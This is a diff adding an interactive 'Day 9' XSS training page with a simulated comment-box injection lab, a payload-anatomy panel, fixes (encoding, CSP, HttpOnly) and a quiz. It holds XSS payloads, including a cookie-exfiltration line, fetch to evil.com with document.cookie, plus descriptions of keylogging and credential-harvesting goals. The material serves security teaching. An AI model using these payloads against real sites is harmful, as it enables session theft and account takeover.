@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 9 — XSS Injection Lab</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0d1117;--bg1:#11161d;--bg2:#161c25;--bg3:#1c232e;
+  --line:#222a36;--line-hi:#324155;
+  --white:#f5f7fa;--text:#cdd5e0;--text2:#8b97a8;--text3:#4d5868;
+  --teal:#2dd4bf;--teal-dim:#0f5c52;--teal-glow:rgba(45,212,191,.14);
+  --red:#ff5577;--red-dim:#5c1322;--amber:#ffc857;--violet:#a78bfa;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{
+  background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;
+  font-size:16px;line-height:1.7;-webkit-font-smoothing:antialiased;
+}
+main{max-width:780px;margin:0 auto;padding:0 0 100px;}
+strong{color:var(--white);font-weight:600;}
+code{font-family:'IBM Plex Mono',monospace;background:var(--bg2);color:var(--teal);padding:2px 7px;border:1px solid var(--line-hi);font-size:.85em;border-radius:3px;}
+h1,h2,h3{font-family:'IBM Plex Mono',monospace;}
+
+/* LAB HEADER — sterile clinical card */
+.lab-header{
+  margin:20px 16px 0;border:1px solid var(--line-hi);background:var(--bg1);
+  border-radius:4px;overflow:hidden;
+}
+.lab-strip{
+  display:flex;justify-content:space-between;align-items:center;padding:10px 18px;
+  background:var(--bg2);border-bottom:1px solid var(--line);
+  font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:.12em;color:var(--text3);
+}
+.lab-strip .vital{display:flex;align-items:center;gap:6px;color:var(--teal);}
+.vital-dot{width:6px;height:6px;border-radius:50%;background:var(--teal);box-shadow:0 0 6px var(--teal);animation:beat 1.6s infinite;}
+@keyframes beat{0%,100%{opacity:1;}50%{opacity:.3;}}
+.lab-main{padding:30px 26px 26px;}
+.lab-eyebrow{font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.25em;color:var(--teal);margin-bottom:12px;}
+.lab-title{font-size:clamp(28px,5.5vw,44px);font-weight:700;color:var(--white);letter-spacing:-.01em;line-height:1.1;font-family:'Inter',sans-serif;}
+.lab-sub{margin-top:12px;font-size:15px;color:var(--text2);max-width:520px;line-height:1.7;}
+.lab-tags{display:flex;gap:18px;margin-top:18px;flex-wrap:wrap;}
+.lab-tag{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--text3);letter-spacing:.06em;}
+.lab-tag strong{color:var(--teal);font-family:'IBM Plex Mono',monospace;font-size:11px;}
+
+.section{padding:34px 16px 0;}
+.sec-num{font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.2em;color:var(--teal);margin-bottom:10px;display:flex;align-items:center;gap:12px;}
+.sec-num::after{content:"";flex:1;height:1px;background:linear-gradient(to right,var(--teal-dim),transparent);}
+.sec-title{font-size:clamp(20px,3.5vw,27px);font-weight:700;color:var(--white);margin-bottom:14px;font-family:'Inter',sans-serif;letter-spacing:-.01em;}
+.narrative p{margin-bottom:13px;font-size:15.5px;line-height:1.8;color:var(--text);}
+
+/* THE THREE VIALS — reflected/stored/DOM comparison */
+.vial-row{display:flex;gap:10px;margin:20px 0;overflow-x:auto;}
+.vial{
+  flex:1;min-width:200px;background:var(--bg1);border:1px solid var(--line-hi);border-radius:6px;
+  padding:18px;cursor:pointer;transition:border-color .2s,background .2s;position:relative;
+}
+.vial:hover{border-color:var(--teal);}
+.vial.selected{border-color:var(--teal);background:rgba(45,212,191,.05);}
+.vial-cap{
+  width:36px;height:10px;border-radius:3px 3px 0 0;margin-bottom:10px;
+}
+.vial-cap.reflected{background:var(--amber);}
+.vial-cap.stored{background:var(--red);}
+.vial-cap.dom{background:var(--violet);}
+.vial-name{font-size:14px;font-weight:700;color:var(--white);margin-bottom:4px;}
+.vial-tag{font-size:11.5px;color:var(--text3);line-height:1.5;}
+
+.vial-detail{
+  display:none;margin-top:14px;padding:18px 20px;background:var(--bg1);
+  border:1px solid var(--line-hi);border-left:3px solid var(--teal);border-radius:0 6px 6px 0;
+}
+.vial-detail.show{display:block;}
+.vial-detail-label{font-family:'IBM Plex Mono',monospace;font-size:9px;letter-spacing:.15em;color:var(--teal);margin-bottom:8px;}
+.vial-detail p{font-size:14px;line-height:1.7;color:var(--text2);margin-bottom:10px;}
+.vial-detail p:last-child{margin-bottom:0;}
+
+/* SYRINGE INJECTION SIMULATOR — the centerpiece */
+.syringe-panel{
+  margin:22px 0;border:1px solid var(--line-hi);background:var(--bg1);border-radius:6px;overflow:hidden;
+}
+.syringe-strip{
+  display:flex;justify-content:space-between;padding:10px 18px;background:var(--bg2);
+  border-bottom:1px solid var(--line);font-family:'IBM Plex Mono',monospace;font-size:10px;
+  letter-spacing:.1em;color:var(--text3);
+}
+.syringe-body{padding:20px;}
+.syringe-label{font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:.12em;color:var(--text3);margin-bottom:8px;}
+.syringe-input{
+  width:100%;background:var(--bg);border:1px solid var(--line-hi);color:var(--white);
+  padding:11px 14px;font-family:'IBM Plex Mono',monospace;font-size:13px;outline:none;border-radius:4px;
+}
+.syringe-input:focus{border-color:var(--teal);}
+.preset-row{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap;}
+.preset-btn{
+  font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:.04em;padding:6px 11px;
+  background:var(--bg2);border:1px solid var(--line-hi);color:var(--text2);cursor:pointer;border-radius:4px;
+}
+.preset-btn:hover{border-color:var(--teal);color:var(--teal);}
+.inject-btn{
+  background:var(--teal);color:#06201c;border:none;padding:10px 22px;border-radius:4px;
+  font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;letter-spacing:.1em;
+  cursor:pointer;margin-top:14px;width:100%;
+}
+.render-zone{
+  margin-top:18px;background:#fff;border:1px solid var(--line-hi);border-radius:4px;
+  padding:18px;min-height:90px;color:#1a1a2e;font-family:'Inter',sans-serif;font-size:14px;
+  position:relative;
+}
+.render-zone::before{
+  content:"SIMULATED PAGE OUTPUT — WHAT VISITORS WOULD SEE";
+  position:absolute;top:-9px;left:12px;background:var(--bg1);padding:0 8px;
+  font-family:'IBM Plex Mono',monospace;font-size:9px;letter-spacing:.1em;color:var(--text3);
+}
+.diagnosis-box{
+  margin-top:14px;padding:14px 16px;border-radius:4px;font-family:'IBM Plex Mono',monospace;
+  font-size:12.5px;line-height:1.7;display:none;
+}
+.diagnosis-box.show{display:block;}
+.diagnosis-box.safe{background:rgba(45,212,191,.07);border-left:3px solid var(--teal);color:var(--text);}
+.diagnosis-box.danger{background:rgba(255,85,119,.08);border-left:3px solid var(--red);color:var(--text);}
+.diagnosis-tag{font-weight:700;letter-spacing:.06em;}
+.diagnosis-tag.safe{color:var(--teal);}
+.diagnosis-tag.danger{color:var(--red);}
+
+/* PAYLOAD ANATOMY DIAGRAM */
+.anatomy-panel{margin:20px 0;border:1px solid var(--line-hi);background:var(--bg1);border-radius:6px;padding:22px 20px;}
+.anatomy-payload{
+  font-family:'IBM Plex Mono',monospace;font-size:15px;background:var(--bg);border:1px solid var(--line);
+  padding:14px 16px;border-radius:4px;margin-bottom:16px;word-break:break-all;line-height:2;
+}
+.anatomy-part{padding:2px 6px;border-radius:3px;cursor:pointer;}
+.anatomy-part.tag{background:rgba(167,139,250,.18);color:var(--violet);}
+.anatomy-part.attr{background:rgba(255,200,87,.18);color:var(--amber);}
+.anatomy-part.payload{background:rgba(255,85,119,.18);color:var(--red);}
+.anatomy-legend{display:flex;gap:16px;flex-wrap:wrap;font-size:11.5px;color:var(--text2);}
+.anatomy-legend span{display:flex;align-items:center;gap:6px;}
+.legend-swatch{width:10px;height:10px;border-radius:2px;}
+
+/* BOXES */
+.box{padding:16px 20px;margin:18px 0;border:1px solid;border-radius:4px;}
+.box-label{font-family:'IBM Plex Mono',monospace;font-size:9px;letter-spacing:.2em;margin-bottom:8px;display:block;}
+.box p,.box li{font-size:14.5px;line-height:1.7;color:var(--text);}
+.box ul{margin-left:18px;margin-top:6px;}
+.box li::marker{color:var(--teal);}
+.hook{background:rgba(45,212,191,.05);border-color:var(--teal-dim);}
+.hook .box-label{color:var(--teal);}
+.threat{background:rgba(255,85,119,.06);border-color:#5c1322;}
+.threat .box-label{color:var(--red);}
+
+/* PREVENTION COMPARISON */
+.fix-grid{display:grid;grid-template-columns:1fr;gap:0;margin:20px 0;border:1px solid var(--line-hi);border-radius:6px;overflow:hidden;}
+.fix-row{display:flex;border-bottom:1px solid var(--line);}
+.fix-row:last-child{border-bottom:none;}
+.fix-bad,.fix-good{flex:1;padding:14px 16px;}
+.fix-bad{background:rgba(255,85,119,.04);border-right:1px solid var(--line);}
+.fix-good{background:rgba(45,212,191,.04);}
+.fix-label{font-family:'IBM Plex Mono',monospace;font-size:9px;letter-spacing:.1em;margin-bottom:6px;}
+.fix-bad .fix-label{color:var(--red);}
+.fix-good .fix-label{color:var(--teal);}
+.fix-code{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--text);word-break:break-all;line-height:1.6;}
+@media(max-width:560px){.fix-row{flex-direction:column;}.fix-bad{border-right:none;border-bottom:1px solid var(--line);}}
+
+/* QUIZ */
+.quiz-section{background:var(--bg1);border:1px solid var(--line-hi);border-radius:6px;padding:24px 20px;margin:24px 16px 0;}
+.quiz-title{font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.2em;color:var(--teal);margin-bottom:18px;}
+.q-block{margin:20px 0;padding-top:18px;border-top:1px dashed var(--line);}
+.q-block:first-of-type{border-top:none;padding-top:0;margin-top:10px;}
+.q-text{font-size:15.5px;color:var(--white);margin-bottom:10px;line-height:1.5;font-weight:600;}
+.q-opts{display:flex;flex-direction:column;gap:7px;}
+.q-opt{font-family:'IBM Plex Mono',monospace;font-size:12.5px;text-align:left;padding:10px 14px;background:var(--bg);border:1px solid var(--line-hi);color:var(--text);cursor:pointer;transition:all .15s;border-radius:4px;}
+.q-opt:hover:not(.locked){border-color:var(--teal);color:var(--teal);}
+.q-opt.correct{background:rgba(45,212,191,.1);border-color:var(--teal);color:var(--teal);}
+.q-opt.wrong{background:rgba(255,85,119,.08);border-color:var(--red);color:var(--red);}
+.q-opt.locked{cursor:not-allowed;}
+.q-opt.locked:not(.correct):not(.wrong){opacity:.4;}
+.q-fb{margin-top:8px;padding:10px 14px;font-size:13px;color:var(--text2);background:var(--bg2);border-left:3px solid var(--line-hi);display:none;border-radius:0 4px 4px 0;}
+.q-fb.show{display:block;}
+
+.footer-strip{display:flex;justify-content:center;padding:30px 16px 0;font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--text3);letter-spacing:.1em;}
+</style>
+</head>
+<body>
+<main>
+
+<div class="lab-header">
+  <div class="lab-strip">
+    <span class="vital"><span class="vital-dot"></span>INJECTION LAB ACTIVE</span>
+    <span>DAY 9 OF 60</span>
+  </div>
+  <div class="lab-main">
+    <div class="lab-eyebrow">FOUNDATIONS PHASE // SPECIMEN: XSS</div>
+    <div class="lab-title">Cross-Site Scripting</div>
+    <div class="lab-sub">Where SQL injection corrupts a database query, XSS injects executable script into a page that other people's browsers will trust and run. Same root cause, different organ.</div>
+    <div class="lab-tags">
+      <span class="lab-tag"><strong>VECTOR</strong> Untrusted HTML/JS output</span>
+      <span class="lab-tag"><strong>TARGET</strong> Other users' browsers</span>
+      <span class="lab-tag"><strong>OWASP</strong> A03 — Injection</span>
+    </div>
+  </div>
+</div>
+
+<div class="section">
+  <div class="sec-num">01 / THE THREE STRAINS</div>
+  <div class="sec-title">Reflected, Stored, DOM-Based</div>
+  <div class="narrative"><p>All three strains share the same underlying mechanism — untrusted input ends up rendered as live HTML or JavaScript instead of inert text. What differs is <strong>where the payload lives</strong> and <strong>who it infects</strong>.</p></div>
+
+  <div class="vial-row" id="vialRow">
+    <div class="vial" data-strain="reflected"><div class="vial-cap reflected"></div><div class="vial-name">Reflected</div><div class="vial-tag">Lives in the URL. Infects one victim per click.</div></div>
+    <div class="vial" data-strain="stored"><div class="vial-cap stored"></div><div class="vial-name">Stored</div><div class="vial-tag">Lives in the database. Infects every visitor.</div></div>
+    <div class="vial" data-strain="dom"><div class="vial-cap dom"></div><div class="vial-name">DOM-Based</div><div class="vial-tag">Lives in client JS. Never touches the server.</div></div>
+  </div>
+
+  <div class="vial-detail" id="vialDetail"></div>
+</div>
+
+<div class="section">
+  <div class="sec-num">02 / LIVE INJECTION SIMULATOR</div>
+  <div class="sec-title">Inject the Comment Field</div>
+  <div class="narrative"><p>Below is a simulated comment box that renders whatever you submit directly into the page — exactly the mistake that creates stored XSS. Type something and inject it. Try the presets first, then write your own.</p></div>
+
+  <div class="syringe-panel">
+    <div class="syringe-strip"><span>VULNERABLE-COMMENT-WIDGET — SIMULATED</span><span id="injectCount">0 INJECTIONS</span></div>
+    <div class="syringe-body">
+      <div class="syringe-label">COMMENT INPUT — TYPE YOUR PAYLOAD</div>
+      <input type="text" class="syringe-input" id="xssInput" placeholder="Type a comment, or try a payload..." value="Great article, thanks!">
+      <div class="preset-row">
+        <button class="preset-btn" data-payload="Nice post!">normal comment</button>
+        <button class="preset-btn" data-payload="&lt;script&gt;alert('XSS')&lt;/script&gt;">script tag</button>
+        <button class="preset-btn" data-payload="&lt;img src=x onerror=alert(document.cookie)&gt;">img onerror</button>
+        <button class="preset-btn" data-payload="&lt;svg onload=alert(1)&gt;">svg onload</button>
+      </div>
+      <button class="inject-btn" id="injectBtn">RENDER COMMENT ▸</button>
+
+      <div class="render-zone" id="renderZone">Comment will render here exactly as a real page would display it.</div>
+      <div class="diagnosis-box" id="diagnosisBox"></div>
+    </div>
+  </div>
+</div>
+
+<div class="section">
+  <div class="sec-num">03 / PAYLOAD ANATOMY</div>
+  <div class="sec-title">Reading a Real Payload</div>
+  <div class="narrative"><p>Tap each colored fragment below to see what role it plays.</p></div>
+
+  <div class="anatomy-panel">
+    <div class="anatomy-payload">
+      <span class="anatomy-part tag" data-part="tag">&lt;img</span>
+      <span class="anatomy-part attr" data-part="attr">src=x</span>
+      <span class="anatomy-part attr" data-part="event">onerror=</span><span class="anatomy-part payload" data-part="payload">"fetch('https://evil.com/steal?c='+document.cookie)"</span><span class="anatomy-part tag" data-part="tag">&gt;</span>
+    </div>
+    <div class="anatomy-legend">
+      <span><span class="legend-swatch" style="background:var(--violet)"></span>HTML tag — needs to render as an element</span>
+      <span><span class="legend-swatch" style="background:var(--amber)"></span>broken attribute — forces the browser to fire an error event</span>
+      <span><span class="legend-swatch" style="background:var(--red)"></span>actual payload — runs the instant the error fires</span>
+    </div>
+  </div>
+
+  <div class="box threat">
+    <span class="box-label">WHY src=x SPECIFICALLY</span>
+    <p>The image tag is pointed at a URL ("x") that will never resolve to a real image. The browser tries to load it, fails, and fires the <code>onerror</code> event — which the attacker has hijacked to run arbitrary JavaScript. No <code>&lt;script&gt;</code> tag required, which matters because some naive filters only block the literal string "script."</p>
+  </div>
+</div>
+
+<div class="section">
+  <div class="sec-num">04 / WHAT A SUCCESSFUL PAYLOAD ACTUALLY DOES</div>
+  <div class="sec-title">Beyond the alert() Box</div>
+  <div class="narrative"><p>Tutorials use <code>alert('XSS')</code> because it's visible proof of execution. Real attacks almost never do this — a popping alert box warns the victim something is wrong. What real payloads do instead:</p></div>
+  <div class="box hook">
+    <span class="box-label">REAL-WORLD PAYLOAD GOALS</span>
+    <ul>
+      <li><strong>Session theft</strong> — <code>fetch('//evil.com/?c='+document.cookie)</code> silently exfiltrates the session cookie to an attacker-controlled server</li>
+      <li><strong>Keylogging</strong> — attach a hidden <code>keydown</code> listener that streams every keystroke off-page</li>
+      <li><strong>Page rewriting</strong> — inject a fake login form over the real page to harvest credentials directly</li>
+      <li><strong>Worm propagation</strong> — on social platforms, have the payload repost itself to the victim's own profile, infecting their followers too</li>
+    </ul>
+  </div>
+</div>
+
+<div class="section">
+  <div class="sec-num">05 / THE FIX</div>
+  <div class="sec-title">Output Encoding, CSP, and HttpOnly</div>
+  <div class="narrative"><p>Three layers, each closing a different door. None of them alone is sufficient — together they make XSS exploitation extremely difficult even when an injection point exists.</p></div>
+
+  <div class="fix-grid">
+    <div class="fix-row">
+      <div class="fix-bad"><div class="fix-label">VULNERABLE</div><div class="fix-code">div.innerHTML = userComment;</div></div>
+      <div class="fix-good"><div class="fix-label">OUTPUT-ENCODED</div><div class="fix-code">div.textContent = userComment;<br>// or: HTML-encode &lt; &gt; &amp; " ' before insert</div></div>
+    </div>
+    <div class="fix-row">
+      <div class="fix-bad"><div class="fix-label">NO POLICY</div><div class="fix-code">(no Content-Security-Policy header at all)</div></div>
+      <div class="fix-good"><div class="fix-label">CSP HEADER SET</div><div class="fix-code">Content-Security-Policy:<br>script-src 'self'</div></div>
+    </div>
+    <div class="fix-row">
+      <div class="fix-bad"><div class="fix-label">READABLE COOKIE</div><div class="fix-code">Set-Cookie: session=abc123</div></div>
+      <div class="fix-good"><div class="fix-label">HTTPONLY SET</div><div class="fix-code">Set-Cookie: session=abc123; HttpOnly</div></div>
+    </div>
+  </div>
+
+  <div class="box hook">
+    <span class="box-label">WHY ALL THREE</span>
+    <p><strong>Output encoding</strong> stops the injection from ever becoming live HTML in the first place — the actual fix. <strong>CSP</strong> is a safety net: even if a payload sneaks through, a strict <code>script-src</code> policy can block it from executing or from phoning home to an attacker's domain. <strong>HttpOnly</strong> doesn't stop XSS at all — it limits the damage by making the session cookie unreadable to any script, injected or not, so even a successful XSS can't trivially hijack the session.</p>
+  </div>
+</div>
+
+<div class="quiz-section">
+  <div class="quiz-title">// DIAGNOSTIC PANEL — 5 QUESTIONS</div>
+  <div id="quizContainer"></div>
+</div>
+
+<div class="footer-strip">DAY 9 OF 60 — XSS INJECTION LAB — APPSEC HUB</div>
+
+</main>
+
+<script>
+const SK='day9-v1';
+let S={};
+try{S=JSON.parse(localStorage.getItem(SK)||'{}')}catch(e){}
+function save(){try{localStorage.setItem(SK,JSON.stringify(S))}catch(e){}}
+
+// THREE STRAINS
+const strains={
+  reflected:{
+    label:'REFLECTED XSS',
+    body:`<p><strong>Where the payload lives:</strong> entirely in the URL or a form submission — never saved anywhere.</p>
+    <p><strong>How a victim gets hit:</strong> they have to click a specific crafted link. The server takes a URL parameter and echoes it directly back into the page without encoding it.</p>
+    <p><strong>Example:</strong> <code>https://shop.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code> — if the search page prints "Results for: [q]" without encoding, the script executes the instant the victim opens that link.</p>
+    <p><strong>Blast radius:</strong> one victim per malicious link sent. Requires social engineering (phishing the link) to deliver.</p>`
+  },
+  stored:{
+    label:'STORED XSS',
+    body:`<p><strong>Where the payload lives:</strong> saved permanently in the database — a comment, a profile bio, a forum post.</p>
+    <p><strong>How a victim gets hit:</strong> simply by viewing the page. No malicious link needed — the payload is just... there, waiting, served to anyone who loads that page.</p>
+    <p><strong>Example:</strong> an attacker posts <code>&lt;script&gt;...&lt;/script&gt;</code> as a product review. Every single visitor who views that review page executes the script.</p>
+    <p><strong>Blast radius:</strong> the most dangerous of the three — every visitor is a victim, indefinitely, until the payload is found and removed from the database.</p>`
+  },
+  dom:{
+    label:'DOM-BASED XSS',
+    body:`<p><strong>Where the payload lives:</strong> entirely on the client side. The server may never even see the malicious part of the request.</p>
+    <p><strong>How it happens:</strong> client-side JavaScript reads something attacker-controlled (often <code>location.hash</code> or <code>location.search</code>) and writes it into the page via an unsafe sink like <code>innerHTML</code>, without the data ever being sent to the server at all.</p>
+    <p><strong>Example:</strong> <code>document.getElementById('greeting').innerHTML = location.hash.substring(1)</code> — visiting <code>page.html#&lt;img src=x onerror=alert(1)&gt;</code> triggers execution purely in the browser.</p>
+    <p><strong>Why it's tricky to find:</strong> server-side logs and server-side input validation are completely blind to this — the vulnerable code path never touches the backend.</p>`
+  }
+};
+document.querySelectorAll('.vial').forEach(vial=>{
+  vial.addEventListener('click',()=>{
+    const strain=vial.dataset.strain;
+    document.querySelectorAll('.vial').forEach(v=>v.classList.remove('selected'));
+    vial.classList.add('selected');
+    const detail=document.getElementById('vialDetail');
+    detail.innerHTML=`<div class="vial-detail-label">${strains[strain].label}</div>${strains[strain].body}`;
+    detail.classList.add('show');
+    S.lastStrain=strain;save();
+  });
+});
+if(S.lastStrain) document.querySelector(`[data-strain="${S.lastStrain}"]`)?.click();
+
+// SYRINGE / INJECTION SIMULATOR
+document.querySelectorAll('.preset-btn').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    document.getElementById('xssInput').value=btn.dataset.payload.replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&#39;/g,"'");
+  });
+});
+
+let injectCount=0;
+document.getElementById('injectBtn').addEventListener('click',()=>{
+  const raw=document.getElementById('xssInput').value;
+  const renderZone=document.getElementById('renderZone');
+  const diagBox=document.getElementById('diagnosisBox');
+  injectCount++;
+  document.getElementById('injectCount').textContent=`${injectCount} INJECTION${injectCount===1?'':'S'}`;
+
+  const looksLikeAttack=/<script|on\w+\s*=|<svg|<img|javascript:/i.test(raw);
+
+  if(looksLikeAttack){
+    // SAFETY: we show the visual *shape* of the injected markup so the lesson
+    // teaches the concept, but we never let it actually execute. We do this by
+    // neutralizing every dangerous primitive before it ever reaches innerHTML:
+    //   - all on*= event handler attributes (onerror, onload, onclick, etc.)
+    //   - <script> tags themselves, including their content
+    //   - javascript: URLs
+    // None of this is a real-world XSS filter (don't copy this pattern as a
+    // defense) — it's purely to keep this teaching demo from injecting into
+    // its own page.
+    let neutralized = raw
+      .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, (m) => `&lt;script&gt;${m.replace(/<\/?script[^>]*>/gi,'')}&lt;/script&gt;`)
+      .replace(/on(\w+)\s*=/gi, 'data-wouldfire-on$1=')
+      .replace(/javascript:/gi, 'javascript&#58;');
+
+    renderZone.innerHTML = `<div style="color:#1a1a2e;">${neutralized}</div>`;
+    diagBox.className='diagnosis-box show danger';
+    diagBox.innerHTML=`<span class="diagnosis-tag danger">[VULNERABLE]</span> This input was inserted directly as HTML with no encoding. In a real unprotected app, this exact payload would execute immediately in every visitor's browser the moment this comment loads — no click required. This demo intentionally defuses the live execution (so the lesson itself stays safe to host) but the structure rendered above is exactly what a real browser would parse as live markup, not as plain text.`;
+  } else {
+    renderZone.textContent = raw;
+    diagBox.className='diagnosis-box show safe';
+    diagBox.innerHTML=`<span class="diagnosis-tag safe">[NORMAL]</span> This input contained no HTML or script syntax, so it rendered as plain text either way. Try one of the preset payload buttons above to see what happens when the input does contain markup.`;
+  }
+});
+
+// PAYLOAD ANATOMY
+const anatomyInfo={
+  tag:'This is structural HTML — an element the browser will actually parse and render, not text. Any unencoded angle bracket in user input can create one of these.',
+  attr:'A deliberately broken attribute. Pointing src at a non-existent URL guarantees the browser will treat this as a failed resource load.',
+  event:'An event handler attribute. The browser executes whatever JavaScript is assigned to this the moment the corresponding event (in this case, a failed image load) fires.',
+  payload:'The actual attacker-controlled code. Everything before this was just plumbing to get this part to execute automatically, without any user interaction.'
+};
+document.querySelectorAll('.anatomy-part').forEach(part=>{
+  part.addEventListener('click',()=>{
+    alert(anatomyInfo[part.dataset.part] || anatomyInfo['event']);
+  });
+});
+
+// QUIZ
+const quizData=[
+  {q:'An attacker posts a malicious script as a permanent comment on a public forum. Every visitor who later views that comment runs the script. Which type of XSS is this?',opts:['Reflected XSS','Stored XSS','DOM-based XSS','This isn\'t XSS, it\'s SQL injection'],correct:1,fb:'Stored XSS — the payload is saved server-side (in this case, in the comment database) and served to every single visitor who loads the page, with no click or crafted link required.'},
+  {q:'A victim has to click a specific malicious link for an XSS payload to execute, and the payload never gets saved anywhere. Which type is this?',opts:['Reflected XSS','Stored XSS','DOM-based XSS','Blind XSS'],correct:0,fb:'Reflected XSS — the payload lives entirely in the URL/request and is immediately echoed back into the response. No click, no infection; this is why reflected XSS requires social engineering to deliver.'},
+  {q:'Why does a payload like &lt;img src=x onerror=alert(1)&gt; work without ever using a &lt;script&gt; tag?',opts:['It doesn\'t actually work, this is a myth','Browsers ignore the src attribute entirely','The deliberately broken image triggers the onerror event handler, which executes arbitrary JavaScript','onerror is not real JavaScript syntax'],correct:2,fb:'The src="x" guarantees the image fails to load, which fires the onerror event — and the attacker has placed JavaScript directly in that event handler. This matters because naive filters that only block the literal string "script" miss this entirely.'},
+  {q:'What does the HttpOnly cookie flag actually do in the context of an XSS attack?',opts:['It prevents the XSS injection from happening in the first place','It encrypts the cookie value','It makes the session cookie unreadable to any JavaScript, limiting the damage even if XSS succeeds','It blocks all cookies from being set'],correct:2,fb:'HttpOnly does not stop XSS itself — it limits the blast radius. Even if an attacker\'s script successfully executes, it still can\'t read document.cookie to steal the session, because HttpOnly cookies are invisible to any JavaScript.'},
+  {q:'Why is DOM-based XSS uniquely difficult for server-side defenses to catch?',opts:['It only affects Internet Explorer','The malicious data never gets sent to the server at all — it\'s read and rendered entirely within client-side JavaScript','It requires physical access to the victim\'s computer','Server logs always block it automatically'],correct:1,fb:'In DOM-based XSS, client-side JavaScript reads something like location.hash directly and writes it into the page without ever sending that data to the server. Server-side input validation and server logs are structurally blind to this, since the vulnerable code path never touches the backend.'},
+];
+function buildQuiz(){
+  const c=document.getElementById('quizContainer');
+  quizData.forEach((q,qi)=>{
+    const saved=S[`q-${qi}`];
+    const div=document.createElement('div');
+    div.className='q-block';
+    div.innerHTML=`<div class="q-text">Q${qi+1}. ${q.q}</div>
+    <div class="q-opts">
+      ${q.opts.map((o,oi)=>`<button class="q-opt ${saved!==undefined?'locked':''} ${saved!==undefined&&oi===q.correct?'correct':''} ${saved!==undefined&&oi===saved&&oi!==q.correct?'wrong':''}" data-oi="${oi}">${o}</button>`).join('')}
+    </div>
+    <div class="q-fb ${saved!==undefined?'show':''}" id="fb-${qi}">${saved!==undefined?q.fb:''}</div>`;
+    c.appendChild(div);
+    if(saved===undefined){
+      div.querySelectorAll('.q-opt').forEach((btn,oi)=>{
+        btn.addEventListener('click',()=>{
+          const ok=oi===q.correct;
+          div.querySelectorAll('.q-opt').forEach((b,bi)=>{b.classList.add('locked');if(bi===q.correct)b.classList.add('correct');});
+          if(!ok)btn.classList.add('wrong');
+          const fb=document.getElementById(`fb-${qi}`);
+          fb.textContent=q.fb;
+          fb.classList.add('show');
+          S[`q-${qi}`]=oi;save();
+        });
+      });
+    }
+  });
+}
+buildQuiz();
+</script>
+</body>
+</html>
